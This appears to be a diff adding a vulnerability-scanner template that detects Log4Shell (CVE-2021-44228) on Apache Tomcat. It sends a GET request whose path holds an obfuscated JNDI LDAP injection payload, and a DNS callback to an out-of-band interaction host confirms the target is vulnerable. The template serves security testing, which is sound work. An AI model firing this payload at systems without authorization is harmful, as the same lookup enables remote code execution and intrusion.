@@ -1,0 +1,41 @@
+id: log4j-apache-tomcat-generic
+
+info:
+  name: Apache Tomcat Path Normalization Trick - Log4j RCE
+  author: aravazhimdr
+  severity: critical
+  description: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
+  reference:
+    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
+    - https://www.lunasec.io/docs/blog/log4j-zero-day/
+    - https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
+  tags: cve,cve2021,rce,oast,log4j
+
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/$%7Bjndi:ldap:$%7B::-/%7D/{{Host}}.{{interactsh-url}}%7D/"
+
+    headers:
+       User-Agent: Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([A-Za-z0-9\.\-\_]+)\.([a-z0-9]+)\.([a-z]+)\.([a-z]{2,4})'
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([A-Za-z0-9\.\-\_]+)\.([a-z0-9]+)\.([a-z]+)\.([a-z]{2,4})'   # Extract ${hostName}
+
